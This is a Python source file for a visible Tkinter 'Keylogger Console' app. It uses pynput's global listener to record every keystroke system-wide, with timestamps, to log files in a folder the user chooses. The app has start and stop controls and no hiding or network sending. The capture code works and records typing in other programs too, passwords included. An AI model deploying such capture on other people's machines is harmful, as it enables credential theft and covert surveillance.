import os
import tkinter as tk
from tkinter.scrolledtext import ScrolledText
from tkinter import filedialog
from pynput import keyboard
import datetime
import time


class LiveKeylogger:
    def __init__(self, root):
        self.root = root
        self.root.title("Live Key Tracker")
        self.root.geometry("600x480")
        self.root.configure(bg="#1c1c1c")

        self.listener = None
        self.running = False
        self.log_dir = ""
        self.log_file = ""
        self.full_log_file = ""
        self.key_logs = []

        # For debouncing repeated keys
        self.last_key = None
        self.last_key_time = 0

        # Prevent GUI from processing key events so keys don't affect GUI elements
        self.root.bind_all("<Key>", lambda e: "break")

        # Title label
        tk.Label(
            root, text="Keylogger Console", font=("Helvetica", 16, "bold"),
            bg="#1c1c1c", fg="#00ffff"
        ).pack(pady=10)

        # Output box
        self.output = ScrolledText(
            root, height=15, width=70,
            bg="#2b2b2b", fg="#f1f1f1", insertbackground="white",
            font=("Consolas", 10), state=tk.DISABLED
        )
        self.output.pack(padx=10, pady=5)

        # Status label
        self.status = tk.Label(
            root, text="Status: Idle", bg="#1c1c1c",
            fg="gray", font=("Arial", 10, "italic")
        )
        self.status.pack(pady=5)

        # Folder chooser button
        self.select_btn = tk.Button(
            root, text="Choose Folder to Save Logs", command=self.choose_folder,
            bg="#3498db", fg="white", width=30, font=("Arial", 10, "bold")
        )
        self.select_btn.pack(pady=5)

        # Start/Stop toggle button
        self.toggle_btn = tk.Button(
            root, text="Start Logging", command=self.toggle_logging,
            bg="#27ae60", fg="white", width=20, font=("Arial", 10, "bold")
        )
        self.toggle_btn.pack(pady=10)

    def choose_folder(self):
        selected = filedialog.askdirectory()
        if selected:
            self.log_dir = selected
            self.log_file = os.path.join(self.log_dir, "live_keylog.txt")
            self.full_log_file = os.path.join(self.log_dir, "full_log.txt")
            self.write_output(f"[✓] Log directory set to: {self.log_dir}")

    def on_press(self, key):
        current_time = time.time()

        # Debounce: ignore repeated keys within 0.1 seconds
        if key == self.last_key and (current_time - self.last_key_time) < 0.1:
            return
        self.last_key = key
        self.last_key_time = current_time

        timestamp = datetime.datetime.now().strftime("%H:%M:%S")

        # Get key character or name
        if hasattr(key, 'char') and key.char is not None:
            k = key.char
        else:
            k = str(key)

        # Normalize keys for display
        if k in (" ", "Key.space"):
            k = "[SPACE]"
        elif k in ("\n", "Key.enter"):
            k = "[ENTER]"
        elif k == "Key.backspace":
            k = "[BACKSPACE]"
        elif k.startswith("Key."):
            k = f"[{k.split('.')[1].upper()}]"

        line = f"{timestamp} - {k}"

        self.key_logs.append(line)
        self.write_output(line)

        if self.log_file:
            try:
                with open(self.log_file, "a", encoding="utf-8") as f:
                    f.write(line + "\n")
            except Exception as e:
                self.write_output(f"[!] Error writing to log file: {e}")

    def write_output(self, line):
        self.output.config(state=tk.NORMAL)
        self.output.insert(tk.END, line + "\n")
        self.output.config(state=tk.DISABLED)
        self.output.see(tk.END)

    def toggle_logging(self):
        if not self.running:
            if not self.log_dir:
                self.write_output("[!] Please choose a folder to save logs first.")
                return
            self.start_logging()
        else:
            self.stop_logging()

    def start_logging(self):
        if self.listener and self.listener.running:
            self.write_output("[!] Logging is already active.")
            return

        self.status.config(text="Status: Logging...", fg="#00ff99")
        self.toggle_btn.config(text="Stop Logging", bg="#e74c3c")
        self.key_logs = []

        try:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(f"\n--- New Session: {datetime.datetime.now()} ---\n")
        except Exception as e:
            self.write_output(f"[!] Error opening log file: {e}")
            return

        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        self.running = True
        self.write_output("[✓] Started logging keys...")

    def stop_logging(self):
        if self.listener:
            self.listener.stop()
            self.listener = None
        self.running = False
        self.status.config(text="Status: Stopped", fg="gray")
        self.toggle_btn.config(text="Start Logging", bg="#27ae60")
        self.write_output("\n--- Logging Stopped ---")

        try:
            with open(self.full_log_file, "a", encoding="utf-8") as f:
                f.write(f"\n--- Full Session: {datetime.datetime.now()} ---\n")
                f.write("\n".join(self.key_logs))
                f.write("\n--- End of Session ---\n\n")
        except Exception as e:
            self.write_output(f"[!] Error saving full session: {e}")


if __name__ == "__main__":
    root = tk.Tk()
    app = LiveKeylogger(root)
    root.mainloop()
